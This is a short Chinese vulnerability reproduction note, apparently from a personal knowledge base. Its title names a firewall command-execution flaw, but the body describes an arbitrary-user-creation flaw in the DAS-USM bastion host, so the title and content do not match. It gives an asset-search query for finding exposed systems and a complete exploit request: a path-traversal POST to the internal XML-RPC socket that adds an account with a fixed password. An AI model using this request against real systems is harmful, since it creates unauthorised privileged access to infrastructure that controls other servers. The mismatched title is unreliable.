# 博达下一代防火墙aaa_portal_auth_local_submit存在命令执行漏洞

# 一、漏洞简介
安恒明御运维审计与风险控制系统（简称“DASUSM”）是一款基于运维安全管理的理论和实践经验，结合各类法律法规（如等级保护、赛班斯法案SOX、PCI、企业内控管理、分级保护、ISO/IEC 27001等）对运维审计的要求，采用B/S架构，集“身份认证（Authentication）、账户管理（Account）、控制权限（Authorization）、日志审计（Audit）”于一体，支持多种字符终端协议、文件传输协议、图形终端协议、远程应用协议的安全监控与历史查询，具备全方位运维风险控制能力的统一安全管理与审计产品。安恒明御运维审计风险控制系统（堡垒机）存在任意用户添加漏洞，攻击者可利用该漏洞添加用户登录堡垒机。

# 二、影响版本
+ 安恒明御运维审计与风险控制系统

# 三、资产测绘
+ hunter:`app.name=="安恒明御运维审计与风险控制系统"`

![1691393320775-2fcf53cd-f670-4d22-a04e-ae7f76d4cb44.png](./img/SZ4CFa0jWYPgqgUv/1691393320775-2fcf53cd-f670-4d22-a04e-ae7f76d4cb44-236122.png)

+ 首页

![1691393366555-3c70041c-447d-415f-a6e6-bd852a153318.png](./img/SZ4CFa0jWYPgqgUv/1691393366555-3c70041c-447d-415f-a6e6-bd852a153318-596904.png)

# 四、漏洞复现
使用exp添加用户`qaxnb666/Admin123..`

```java
POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1
Host: xx.xx.xx.xx
Content-Length: 1112

<?xml version="1.0"?>
<methodCall>
<methodName>web.user_add</methodName>
<params>
<param>
<value>
<array>
<data>
<value>
<string>admin</string>
</value>
<value>
<string>5</string>
</value>
<value>
<string>10.17.1.1</string>
</value>
</data>
</array>
</value>
</param>
<param>
<value>
<struct>
<member>
<name>uname</name>
<value>
<string>qaxnb666</string>
</value>
</member>
<member>
<name>name</name>
<value>
<string>yuwe</string>
</value>
</member>
<member>
<name>pwd</name>
<value>
<string>Admin123..</string>
</value>
</member>
<member>
<name>authmode</name>
<value>
<string>1</string>
</value>
</member>
<member>
<name>deptid</name>
<value>
<string></string>
</value>
</member>
<member>
<name>email</name>
<value>
<string></string>
</value>
</member>
<member>
<name>mobile</name>
<value>
<string></string>
</value>
</member>
<member>
<name>comment</name>
<value>
<string></string>
</value>
</member>
<member>
<name>roleid</name>
<value>
<string>101</string>
</value>
</member>
</struct></value>
</param>
</params>
</methodCall>
```

![1691393678758-f523c4a1-eb67-42fb-ae42-b3bb5c838378.png](./img/SZ4CFa0jWYPgqgUv/1691393678758-f523c4a1-eb67-42fb-ae42-b3bb5c838378-989984.png)

![1691393729985-1a6856f8-5697-483e-a696-b7f1f69a28e9.png](./img/SZ4CFa0jWYPgqgUv/1691393729985-1a6856f8-5697-483e-a696-b7f1f69a28e9-817517.png)



> 更新: 2024-07-17 17:37:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ha1dzr2395nad5m3>